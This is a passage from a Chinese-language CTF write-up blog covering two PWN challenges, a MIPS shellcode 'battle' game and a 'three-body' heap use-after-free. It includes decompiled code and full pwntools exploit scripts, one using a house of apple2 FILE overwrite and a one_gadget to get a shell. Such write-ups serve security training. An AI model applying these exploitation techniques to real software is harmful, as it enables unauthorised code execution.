class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">battle</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  <span class="type">int</span> coin; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// [sp+20h] [+20h]</span></span><br><span class="line">  <span class="type">void</span> (*func_ptr)(...); <span class="comment">// [sp+24h] [+24h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [sp+28h] [+28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[-]The boss&#x27;s DEF is 2751\n[-]The boss&#x27;s ATK is 9999&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[-]Your DEF is 0\n[-]Your ATK is %d\n&quot;</span>, attack);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[-]Now toss a coin to decide who attack first&quot;</span>);</span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  coin = rand() % <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*]The COIN is %d\n&quot;</span>, coin);</span><br><span class="line">  <span class="keyword">if</span> ( coin == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+]Boss get the first attack!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+]0 - 9999 = -9999&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You Died!!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( coin )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Woring!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]You get the first attack!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Attacking...&quot;</span>);</span><br><span class="line">  result = attack - <span class="number">2751</span>;</span><br><span class="line">  <span class="keyword">if</span> ( attack - <span class="number">2751</span> &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your ATK is %d\n&quot;</span>, attack);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You beat the boss!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now open the box which the Princess in.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I have already give you a useful_tools.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Shellcode &gt; &quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x10</span>u);</span><br><span class="line">  func_ptr = (<span class="type">void</span> (*)(...))buf;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(buf); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !check(buf[i]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]BOX: Forbidden!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  useful_tools();</span><br><span class="line">  func_ptr();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是需要满足条件，<code>attack - 2751 &lt; 0</code>，并且shellcode需要被check，这里的check很好绕过，<code>li $a1, 0</code>，前面是\x00，直接绕过了strlen</p>
<p>attack在shop那里，需要满足<code>coin_sum &gt;= 2751</code>，dump出了coin每次rand之后的数，这样coin_sum在100次以内就会大于等于2751</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;39.106.131.193&#x27;</span>, <span class="number">45307</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process([<span class="string">&#x27;./qemu-mipsel-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, file_name])</span><br><span class="line">    <span class="comment">#r = process([&#x27;./qemu-mipsel-static&#x27;, &#x27;-L&#x27;, &#x27;.&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, file_name])</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&#x27;Go&gt; \n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down</span>(<span class="params">count</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;How much do you want?\n&#x27;</span>, <span class="built_in">str</span>(count))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shop</span>(<span class="params">stick</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(stick))</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc=cdll.LoadLibrary(&quot;./lib/libc.so.0&quot;)</span></span><br><span class="line"><span class="comment">#libc.srand(0x1BF52)</span></span><br><span class="line"></span><br><span class="line">down(<span class="number">0</span>)</span><br><span class="line">down(<span class="number">1</span>)</span><br><span class="line">down(<span class="number">2</span>)</span><br><span class="line">down(<span class="number">1</span>)</span><br><span class="line">down(<span class="number">4</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">4</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">8</span>)</span><br><span class="line">down(<span class="number">9</span>)</span><br><span class="line">down(<span class="number">8</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0xb</span>)</span><br><span class="line">down(<span class="number">0xe</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x10</span>)</span><br><span class="line">down(<span class="number">0x11</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">9</span>)</span><br><span class="line">down(<span class="number">0xb</span>)</span><br><span class="line">down(<span class="number">0x13</span>)</span><br><span class="line">down(<span class="number">3</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">4</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x11</span>)</span><br><span class="line">down(<span class="number">0x19</span>)</span><br><span class="line">down(<span class="number">0xe</span>)</span><br><span class="line">down(<span class="number">0x1d</span>)</span><br><span class="line">down(<span class="number">0x1e</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">8</span>)</span><br><span class="line">down(<span class="number">0x21</span>)</span><br><span class="line">down(<span class="number">4</span>)</span><br><span class="line">down(<span class="number">0x11</span>)</span><br><span class="line">down(<span class="number">0x20</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x1d</span>)</span><br><span class="line">down(<span class="number">0x21</span>)</span><br><span class="line">down(<span class="number">0xb</span>)</span><br><span class="line">down(<span class="number">0</span>)</span><br><span class="line">down(<span class="number">0x29</span>)</span><br><span class="line">down(<span class="number">0x2c</span>)</span><br><span class="line">down(<span class="number">3</span>)</span><br><span class="line">down(<span class="number">6</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x2e</span>)</span><br><span class="line">down(<span class="number">0x1d</span>)</span><br><span class="line">down(<span class="number">0x32</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x2f</span>)</span><br><span class="line">down(<span class="number">0x11</span>)</span><br><span class="line">down(<span class="number">0x13</span>)</span><br><span class="line">down(<span class="number">0x35</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x2b</span>)</span><br><span class="line">down(<span class="number">0x34</span>)</span><br><span class="line">down(<span class="number">0x1d</span>)</span><br><span class="line">down(<span class="number">0x20</span>)</span><br><span class="line">down(<span class="number">0x3d</span>)</span><br><span class="line">down(<span class="number">0x35</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x2c</span>)</span><br><span class="line">down(<span class="number">0x29</span>)</span><br><span class="line">down(<span class="number">0x3c</span>)</span><br><span class="line">down(<span class="number">0x21</span>)</span><br><span class="line">down(<span class="number">0x1a</span>)</span><br><span class="line">down(<span class="number">0x27</span>)</span><br><span class="line">down(<span class="number">1</span>)</span><br><span class="line">down(<span class="number">0x35</span>)</span><br><span class="line">down(<span class="number">0x34</span>)</span><br><span class="line">down(<span class="number">0x45</span>)</span><br><span class="line">down(<span class="number">0x1d</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x4a</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x1d</span>)</span><br><span class="line">down(<span class="number">0x45</span>)</span><br><span class="line">down(<span class="number">0x2c</span>)</span><br><span class="line">down(<span class="number">0x21</span>)</span><br><span class="line">down(<span class="number">0x24</span>)</span><br><span class="line">down(<span class="number">0x35</span>)</span><br><span class="line">down(<span class="number">0x54</span>)</span><br><span class="line">down(<span class="number">0x2b</span>)</span><br><span class="line">down(<span class="number">0xe</span>)</span><br><span class="line">down(<span class="number">0x55</span>)</span><br><span class="line">down(<span class="number">0x51</span>)</span><br><span class="line">down(<span class="number">0x59</span>)</span><br><span class="line">down(<span class="number">0x12</span>)</span><br><span class="line">down(<span class="number">0x31</span>)</span><br><span class="line">down(<span class="number">0x5c</span>)</span><br><span class="line">down(<span class="number">0x35</span>)</span><br><span class="line">down(<span class="number">0x18</span>)</span><br><span class="line">down(<span class="number">5</span>)</span><br><span class="line">down(<span class="number">0x5d</span>)</span><br><span class="line">down(<span class="number">0x5f</span>)</span><br><span class="line">down(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#down(0x1d)</span></span><br><span class="line"></span><br><span class="line">shop(<span class="number">3</span>)</span><br><span class="line">shop(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">down(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = b&#x27;\x00\x00&#x27; * 2</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">li $a2, 0</span></span><br><span class="line"><span class="string">xor $a1, $a1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">li(disasm(shellcode))</span><br><span class="line">r.send(shellcode)</span><br><span class="line"><span class="comment">#for i in range(10):</span></span><br><span class="line"><span class="comment">#    li(disasm(b&#x27;\x00&#x27; + b&#x27;\\x&#x27; + bytes(i)))</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="three-body"><a href="#three-body" class="headerlink" title="three-body"></a>three-body</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_1A22</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> index; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_1554(<span class="string">&quot;Select an area you want to abandon to return: &quot;</span>);</span><br><span class="line">  index = read_input();</span><br><span class="line">  <span class="keyword">if</span> ( heap_ptr[index] )</span><br><span class="line">    <span class="keyword">return</span> sub_16AA(heap_ptr[index]);           <span class="comment">// uaf</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> my_error_write(<span class="string">&quot;You haven&#x27;t explored the area and can&#x27;t return from this route.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>uaf，但是show和edit只可以用一次，add有随机概率，不用管，因为申请的堆块不是太多，add直接当正常的来使用，然后一套house of apple2即可</p>
<p>笔者一分钟试一次，试了三次就出来了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;39.106.65.236&#x27;</span>, <span class="number">16484</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbgg</span>():</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&#x27;Your choice: &#x27;</span></span><br><span class="line"></span><br><span class="line">Meet_the_criteria = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Select an area to explore: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Enter the size of the range you want to explore this time: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Your decision: (1: yes / 0: no)&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;It seems that you are confident in yourself, move on.\n&#x27;</span>)</span><br><span class="line">    a = r.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> a == <span class="string">b&#x27;Luck&#x27;</span>:</span><br><span class="line">        li(<span class="string">&#x27;index = &#x27;</span> + <span class="built_in">hex</span>(index))</span><br><span class="line">        Meet_the_criteria.append(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Select an area you want to abandon to return: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please select which area to talk to: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Since remote calls are costly, enter the specific number of words you want to send: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Please write down your conclusions: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(menu, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Select to enter an area to receive a signal from the Trisolarans: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">dbgg()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x710</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x700</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x700</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x700</span>)</span><br><span class="line">li(Meet_the_criteria)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li(<span class="string">&#x27;leak_addr = &#x27;</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;\x00&#x27;</span> * <span class="number">2</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">li(<span class="string">&#x27;heap_addr = &#x27;</span> + <span class="built_in">hex</span>(heap_addr))</span><br><span class="line">heap_base = heap_addr</span><br><span class="line"></span><br><span class="line">libc_base = leak_addr - <span class="number">0x219ce0</span></span><br><span class="line">li(<span class="string">&#x27;libc_base = &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.35.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x700</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x00000000000562ec</span> + libc_base</span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">heap_base = heap_addr - <span class="number">0xe30</span></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">target_addr = heap_base</span><br><span class="line">one = [<span class="number">0x50a37</span>, <span class="number">0xebcf1</span>, <span class="number">0xebcf5</span>, <span class="number">0xebcf8</span>]</span><br><span class="line">one_gadget = one[<span class="number">1</span>] + libc_base</span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>) + p64(leave_ret) + p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x20</span>)</span><br><span class="line">p2 = p2.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">1</span>)</span><br><span class="line">p2 = p2.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(target_addr + <span class="number">0xe0</span>)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(_IO_wfile_jumps)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xd0</span> + <span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(target_addr + <span class="number">0xe0</span> + <span class="number">0xe8</span>)</span><br><span class="line">p2 = p2.ljust(<span class="number">0xd0</span> + <span class="number">0xe8</span> + <span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(one_gadget)</span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(p2), p2)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x900</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x700</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(menu, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>


        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>viol1t</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://viol1t.com/2023/05/19/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E6%98%A5%E5%AD%A3%E8%B5%9BPWN-AK/">https://viol1t.com/2023/05/19/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E6%98%A5%E5%AD%A3%E8%B5%9BPWN-AK/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2023 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
